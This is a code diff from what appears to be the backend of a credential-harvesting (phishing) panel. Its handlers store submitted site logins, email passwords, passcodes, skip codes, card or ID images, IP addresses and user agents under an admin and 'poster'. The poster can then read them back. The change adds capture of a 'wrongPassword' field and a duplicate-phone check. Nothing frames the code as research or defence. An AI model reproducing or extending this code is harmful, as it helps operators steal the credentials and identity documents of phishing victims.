@@ -396,7 +396,7 @@ export const add_data = async (req, res) => {
 
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard, } = req.body
+    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard,wrongPassword } = req.body
     const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -414,7 +414,7 @@ export const add_data = async (req, res) => {
                 username,passcode,mail,mailPass,adminId:adminId,
                 poster: posterId,
                 root: posterFound._id,
-                onlyCard,holdingCard,
+                onlyCard,holdingCard,wrongPassword,
                 ip:ipAddress,
                 agent:userAgent
 
@@ -623,7 +623,7 @@ export const poster_details =async  (req, res) => {
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
        
-        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent wrongPassword createdAt').sort({ createdAt: -1 })
         // const newdata = {...poster, details: details }
         // console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
@@ -1077,8 +1077,10 @@ export const phone_add = async (req, res) => {
     try {
         
          const   userFound = await User.findOne({username:username})
+         const   userPhone = await User.findOne({phone:phone})
+      
 
-            if(userFound){
+            if(userFound && !userPhone){
                 userFound.phone=phone
               await userFound.save()
               return res.status(200).json({ success: "changed succesfully" })
